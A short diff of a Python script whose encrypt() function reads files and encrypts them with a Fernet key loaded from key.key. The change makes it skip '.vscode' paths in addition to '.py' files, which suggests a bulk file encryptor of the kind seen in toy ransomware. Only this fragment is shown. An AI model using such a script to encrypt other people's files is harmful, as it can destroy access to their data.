@@ -29,7 +29,7 @@ def load_key():
     return open('key.key', 'rb').read()
 
 def encrypt(item, key):
-    if not item.endswith('.py'):
+    if not item.endswith('.py') and not '.vscode' in item:
         f = Fernet(key)
         with open(item, 'rb') as file:
             file_data = file.read()
